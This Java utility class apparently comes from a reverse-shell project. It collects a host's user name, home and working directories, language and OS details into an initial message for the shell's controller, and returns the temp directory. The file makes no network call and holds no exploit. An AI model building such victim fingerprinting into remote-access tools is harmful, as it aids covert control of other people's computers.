package com.mtattab.reverseshell.util;

import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
import lombok.experimental.UtilityClass;

@UtilityClass
public class OSUtil {
    public static ReverseShellInfoInitialMessage getComputerInfo() {

        return ReverseShellInfoInitialMessage.builder()
                .userName(System.getProperty("user.name"))
                .userLanguage(System.getProperty("user.language"))
                .userCurrentWorkingDir(System.getProperty("user.dir"))
                .userHome(System.getProperty("user.home"))
                .osName(System.getProperty("os.name"))
                .osArch(System.getProperty("os.arch"))
                .osVersion(System.getProperty("os.version"))
                .build();

    }

    public static String getSystemTmpDir(){

        return System.getProperty("java.io.tmpdir");
    }

}
